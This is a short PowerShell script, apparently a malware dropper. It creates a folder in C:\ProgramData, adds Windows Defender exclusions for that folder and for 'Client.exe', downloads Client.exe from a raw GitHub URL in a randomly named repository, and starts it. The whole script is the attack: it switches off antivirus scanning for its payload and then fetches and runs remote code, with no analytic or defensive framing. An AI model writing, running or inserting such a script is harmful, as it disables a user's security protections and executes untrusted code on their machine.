mkdir C:\ProgramData\TCPMSG
Add-MpPreference -ExclusionPath "C:\ProgramData\TCPMSG"
Add-MpPreference -ExclusionProcess "Client.exe"
$source = 'https://raw.githubusercontent.com/RedTheMenace/werwetfgawsergw345w3tserghwe/main/Client.exe'
$destination = 'C:\ProgramData\TCPMSG\Client.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
Start-Process C:\ProgramData\TCPMSG\Client.exe
exit
